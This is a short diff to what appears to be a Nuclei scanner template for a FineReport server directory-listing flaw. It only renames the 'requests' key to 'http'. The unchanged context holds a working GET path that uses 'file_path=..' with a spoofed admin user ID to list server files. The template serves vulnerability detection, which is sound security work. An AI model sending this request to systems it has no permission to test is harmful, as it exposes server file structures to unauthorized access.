@@ -4,7 +4,7 @@ info:
   author: Str1am
   severity: high
   tags: frServer,listDir
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
